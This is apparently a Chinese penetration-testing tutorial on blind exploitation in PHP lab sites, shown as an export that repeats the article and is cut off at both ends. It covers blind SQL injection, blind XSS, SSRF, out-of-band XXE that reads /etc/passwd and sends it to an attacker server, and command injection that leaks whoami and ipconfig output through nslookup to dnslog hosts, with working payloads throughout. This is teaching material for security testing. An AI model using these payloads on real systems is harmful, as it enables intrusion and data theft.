4545\n```\n[http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545](http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011927228-dc71a133-b743-44db-83a8-7847879faffa.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&name=image.png&originHeight=272&originWidth=1076&size=19631&status=done&style=none&width=538)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011943684-3ba6d898-3620-4c3f-ade8-803b021288c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=1276&size=53498&status=done&style=none&width=638)\n\n## 4、XXE无回显\n因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。\nXXE虽然不是通过DNSlog，但是也同样是外带数据。\n流程如下：\n在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。\n具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。\n1.xml\n```xml\n<!ENTITY% all \"<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>\">%all;\n```\n2.php\n```php\n<?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?>\n```\n3.txt\n```php\n内容空\n```\n\n\npayload：\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % remote SYSTEM\"http://服务器IP地址/xxe/1.xml\">\n%remote;\n%send;\n]>\n```\n## 5、命令执行无回显\n简单的命令执行站点\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161034-780f4d5e-9f34-4707-a863-eafbd9d39650.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&originHeight=162&originWidth=520&status=done&style=none&width=312)\n输入任何命令都无回显\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161304-f8990d48-cbc4-4e55-8e44-d70081631de0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&originHeight=216&originWidth=876&status=done&style=none&width=415)\n### 5.1 Dnslog判断漏洞存在\n[http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn](http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161596-6adcbdeb-489e-4552-be7c-a2a20628eaa6.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&originHeight=307&originWidth=940&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161819-5b984f68-02b5-49b7-94b5-73127adb26da.png#align=left&display=inline&height=190&margin=%5Bobject%2Object%5D&originHeight=479&originWidth=1046&status=done&style=none&width=415)\n### 5.2Dnslog外带数据\n#### 5.2.1 获取windows用户名\n```http\nhttp://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn\n```\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162343-fd422547-5db2-45b0-8264-c6a8b4324b2d.png#align=left&display=inline&height=163&margin=%5Bobject%2Object%5D&originHeight=430&originWidth=1093&status=done&style=none&width=415)\nwindows常用变量：\n```\n//变量                     类型       描述\n//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。\n//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。\n//%CD%                     本地       返回当前目录字符串。\n//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。\n//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。\n//%COMPUTERNAME%           系统       返回计算机的名称。\n//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。\n//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。\n//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。\n//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。\n//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。\n//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。\n//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。\n//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。\n//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。\n//%PATH%                   系统       指定可执行文件的搜索路径。\n//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。\n//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。\n//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。\n//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。\n//%PROCESSOR_REVISION%     系统       返回处理器的版本号。\n//%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。\n//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。\n//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。\n//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。\n//%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。\n//%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。\n//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。\n//%USERNAME%               本地       返回当前登录的用户的名称。\n//%USERPROFILE%            本地       返回当前用户的配置文件的位置。\n//%WINDIR%                 系统       返回操作系统目录的位置。\n```\n#### 5.2.2 其他命令执行\n```http\ncmd /c whoami > temp && certutil -encode -f temp temp&&FOR /F \"eol=- delims=\" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&del temp\n```\n\n```http\ncmd /c ipconfig > temp && certutil -encode -f temp temp&&FOR /F \"eol=- delims=\" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,40%.xxxx.ceye.io & cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&del temp\n```\n\n通过POST传参测试\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162550-1ce46dae-aed3-4995-9021-f8a247144874.png#align=left&display=inline&height=95&margin=%5Bobject%2Object%5D&originHeight=159&originWidth=414&status=done&style=none&width=248)\n传参的内容需要进行url编码\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162770-391b3b8d-9947-440a-9529-5004a5bbd534.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&originHeight=431&originWidth=1521&status=done&style=none&width=415)\nPost传参\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163079-b19d4b32-222e-4b37-ab74-a88964a3839b.png#align=left&display=inline&height=138&margin=%5Bobject%2Object%5D&originHeight=407&originWidth=1226&status=done&style=none&width=416)\nDnslog获取结果\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163323-d049cc56-b450-4492-8ee3-434865c75b6c.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&originHeight=465&originWidth=1135&status=done&style=none&width=415)\nBase64解码获取内容\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163685-f6a56798-fc6e-4dd3-8f6b-520b6a7efd23.png#align=left&display=inline&height=229&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=648&status=done&style=none&width=389)\n\n## 总结\n       在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。\n       无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。\n","source":"_posts/PHP无回显渗透测试总结.md","raw":"---\ntitle: PHP无回显渗透测试总结\ntags: \n  - PHP\n  - web安全\n  - 无回显\n  - 渗透测试\ncategories: web安全\nkeywords: 'web安全,无回显,PHP,渗透测试'\ndescription: 关于一些PHP无回显的渗透测试总结\ncover: /images/phpwhx.png\ndate: 2021-07-02 10:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区：https://xz.aliyun.com/t/9916\n>\n> 作者：ajie\n\n# 0x01前言\n\n在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。\n# 0x02无回显概念\n无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。\n# 0x03不同漏洞的无回显\n## 1、SQL注入无回显\nSQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。\n无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。\n### 1.1 布尔盲注\n       布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：\n1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415)\n2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152514-71e97518-c208-4b9d-9a4e-61b1dcf4357f.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&originHeight=319&originWidth=802&status=done&style=none&width=415)\n3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152745-73cf1785-59ee-4551-9d74-7ba98d2cec44.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&originHeight=290&originWidth=790&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415)\n\n4、通过length()函数判断数据库库名的长度大于1。\n?id=1' and length(database())>1 %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153079-ba58f545-ae61-431e-8818-bc12922659e2.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=856&status=done&style=none&width=415)\n5、在大于8的时候页面返回空，所以数据库库名长度等于8。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153336-eed66eb5-75a1-4e17-b7fe-a758a9223de1.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=847&status=done&style=none&width=415)\n6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码\n?id=1' and ascii(substr((select database()),1,1))>97 %23\n?id=1' and ascii(substr((select database()),1,1))=101 %23\n首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153599-f01e6d2c-ae3c-4f6f-b9ea-1f7fe4b77bdc.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&originHeight=310&originWidth=871&status=done&style=none&width=415)\n7、更改截取的位置，判断后面的字符对应的ascii码值。\n?id=1' and ascii(substr((select database()),2,1))=101 %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153874-95d56f80-1ac9-4a44-93a7-b4d8f7c63939.png#align=left&display=inline&height=147&margin=%5Bobject%2Object%5D&originHeight=287&originWidth=810&status=done&style=none&width=416)\n### 1.2 延时盲注\n       延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。\n1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154171-53cd2d36-c123-4091-ba74-fb80319ba1f9.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=277&originWidth=785&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154477-058cbb12-c306-42db-8afd-7b9c0b26dd87.png#align=left&display=inline&height=154&margin=%5Bobject%2Object%5D&originHeight=295&originWidth=796&status=done&style=none&width=416)\n2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154774-5573d6ac-4de8-4808-b813-7c983b1e63a3.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=418&originWidth=1448&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155245-cac61cf1-0e9f-41cf-a967-182f57ac1554.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=1371&status=done&style=none&width=415)\n3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。\n?id=2' and if((length(database())=8),sleep(5),1) %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155513-36485f8a-abee-4402-a197-44636b0a2f86.png#align=left&display=inline&height=167&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1081&status=done&style=none&width=415)\n4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。\n?id=2' and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155940-da473dc6-2ac2-4ec1-b180-7c6456d0de47.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=423&originWidth=1220&status=done&style=none&width=415)\n5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156315-650ab5b8-b418-4536-bc9e-ba70ca07f13c.png#align=left&display=inline&height=286&margin=%5Bobject%2Object%5D&originHeight=477&originWidth=666&status=done&style=none&width=400)\n### 巧用dnslog进行SQL注入\n       前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。\n#### Dnslog\n       dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。\n#### Load_file()函数\n       数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：\n       1.文件在服务器上\n       2.指定完整路径的文件\n       3.必须有FILE权限\n#### UNC路径\n       UNC路径就是类似\\\\softer这样的形式的网络路径。它符合 **\\\\服务器名\\服务器资源**的格式。在Windows系统中常用于共享文件。如\\\\192.168.1.1\\共享文件夹名。\n#### Dnslog注入实例演示\n1、打开实例站点，很明显这里是只能使用盲注的站点。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156851-edecb966-dc2b-46c0-bbba-280a9a6586f7.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&originHeight=516&originWidth=1046&status=done&style=none&width=415)\n2、通过order by判断出字段数为3。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157359-df1d201d-8e3f-4ae7-abad-93e6f6a15a3a.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&originHeight=451&originWidth=785&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157735-72a8dfd4-3a1d-4bcb-a55f-ff7862eef954.png#align=left&display=inline&height=228&margin=%5Bobject%2Object%5D&originHeight=448&originWidth=814&status=done&style=none&width=415)\n3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158068-3fd1f43e-d354-4c51-a466-2c88660f7ff9.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1035&status=done&style=none&width=415)\n4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：\n```http\n?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.pcijrt.dnslog.cn\n/abc')) %23\n```\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158457-b4c723f7-cdba-43c0-9fc4-5d284d9f1728.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1189&status=done&style=none&width=415)\n5、执行语句之后在dnslog日志中获取到数据库库名为security。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158874-723d612b-a6df-4d1d-a38b-98cf9036ddcb.png#align=left&display=inline&height=168&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1072&status=done&style=none&width=415)\n6、修改子查询里的内容，获取其他数据。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159168-1cca463c-9c90-42db-822d-f944b8727a1f.png#align=left&display=inline&height=185&margin=%5Bobject%2Object%5D&originHeight=537&originWidth=1209&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159492-cc5dc626-b30c-4763-8fb0-f6285add8085.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=490&originWidth=1227&status=done&style=none&width=415)\n\n\n## 2、XSS无回显\nXSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解：\n### 2.1 XSS盲打\n1、如图这里是一个提交看法的功能\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159770-c89b0ec9-0436-4cf8-8f14-803ac998a67e.png#align=left&display=inline&height=171&margin=%5Bobject%2Object%5D&originHeight=500&originWidth=1217&status=done&style=none&width=415)\n2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160001-28ff893d-98ad-43cc-b6a4-3c8c2f982dc9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&originHeight=345&originWidth=569&status=done&style=none&width=341)\n3、登录后台可以看到确实有数据回显\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160252-54df82c0-b513-4071-b4fa-8f2716f4514a.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&originHeight=317&originWidth=1617&status=done&style=none&width=416)\n4、输入弹框语句会在后台成功执行\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160525-58331697-af8f-4fe1-a420-f170f43cb0d6.png#align=left&display=inline&height=128&margin=%5Bobject%2Object%5D&originHeight=362&originWidth=1175&status=done&style=none&width=415)\n5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160770-d75465c1-9a36-4a5f-bb0f-0256f7108eea.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&originHeight=395&originWidth=699&status=done&style=none&width=415)\n### 2.2 通过dnslog判断漏洞存在\n```http\npayload:\n<img src=http://xss.t7y3wc.dnslog.cn>\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688564769-dcba54f1-6694-483e-bbb0-2ef4287b50e8.png#align=left&display=inline&height=294&margin=%5Bobject%2Object%5D&name=image.png&originHeight=588&originWidth=742&size=40726&status=done&style=none&width=371)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688575999-b7c4d322-0f4c-49a4-9da1-496c6dbc6b13.png#align=left&display=inline&height=223&margin=%5Bobject%2Object%5D&name=image.png&originHeight=446&originWidth=1636&size=54194&status=done&style=none&width=818)\n## 3、SSRF无回显\nSSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。\n测试代码如下：\n```php\n<?php \n\techo file_get_contents($_GET['url']);\n?>\n```\n首先通过访问百度可以验证漏洞存在\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011741087-fbffd788-bf83-4b17-90e6-c147539273c9.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1722&size=49389&status=done&style=none&width=861)\n无回显情况即不进行输出，页面返回空\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011767609-826cc500-1e74-42fc-bb0a-e205fd70abb9.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=812&size=9552&status=done&style=none&width=406)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011778291-6d43af3c-3612-4913-a7a4-98d96252c5ee.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=1002&size=18063&status=done&style=none&width=501)\n这种情况可以通过dnslog或者python搭建http服务验证\n1、DNSLOG\n[http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn](http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011861845-ebd9644c-a3d9-4fbd-8777-4c96a1ce90f7.png#align=left&display=inline&height=179&margin=%5Bobject%2Object%5D&name=image.png&originHeight=358&originWidth=1518&size=40848&status=done&style=none&width=759)\n2、python起的http服务\n\n```php\npython3 -m http.server 4545\n```\n[http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545](http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011927228-dc71a133-b743-44db-83a8-7847879faffa.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&name=image.png&originHeight=272&originWidth=1076&size=19631&status=done&style=none&width=538)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011943684-3ba6d898-3620-4c3f-ade8-803b021288c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=1276&size=53498&status=done&style=none&width=638)\n\n## 4、XXE无回显\n因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。\nXXE虽然不是通过DNSlog，但是也同样是外带数据。\n流程如下：\n在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。\n具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。\n1.xml\n```xml\n<!ENTITY% all \"<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>\">%all;\n```\n2.php\n```php\n<?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?>\n```\n3.txt\n```php\n内容空\n```\n\n\npayload：\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % remote SYSTEM\"http://服务器IP地址/xxe/1.xml\">\n%remote;\n%send;\n]>\n```\n## 5、命令执行无回显\n简单的命令执行站点\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161034-780f4d5e-9f34-4707-a863-eafbd9d39650.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&originHeight=162&originWidth=520&status=done&style=none&width=312)\n输入任何命令都无回显\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161304-f8990d48-cbc4-4e55-8e44-d70081631de0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&originHeight=216&originWidth=876&status=done&style=none&width=415)\n### 5.1 Dnslog判断漏洞存在\n[http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn](http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161596-6adcbdeb-489e-4552-be7c-a2a20628eaa6.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&originHeight=307&originWidth=940&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161819-5b984f68-02b5-49b7-94b5-73127adb26da.png#align=left&display=inline&height=190&margin=%5Bobject%2Object%5D&originHeight=479&originWidth=1046&status=done&style=none&width=415)\n### 5.2Dnslog外带数据\n#### 5.2.1 获取windows用户名\n```http\nhttp://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn\n```\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162343-fd422547-5db2-45b0-8264-c6a8b4324b2d.png#align=left&display=inline&height=163&margin=%5Bobject%2Object%5D&originHeight=430&originWidth=1093&status=done&style=none&width=415)\nwindows常用变量：\n```\n//变量                     类型       描述\n//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。\n//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。\n//%CD%                     本地       返回当前目录字符串。\n//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。\n//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。\n//%COMPUTERNAME%           系统       返回计算机的名称。\n//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。\n//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。\n//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。\n//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。\n//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。\n//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。\n//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。\n//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。\n//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。\n//%PATH%                   系统       指定可执行文件的搜索路径。\n//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。\n//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。\n//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。\n//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。\n//%PROCESSOR_REVISION%     系统       返回处理器的版本号。\n//%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。\n//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。\n//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。\n//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。\n//%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。\n//%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。\n//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。\n//%USERNAME%               本地       返回当前登录的用户的名称。\n//%USERPROFILE%            本地       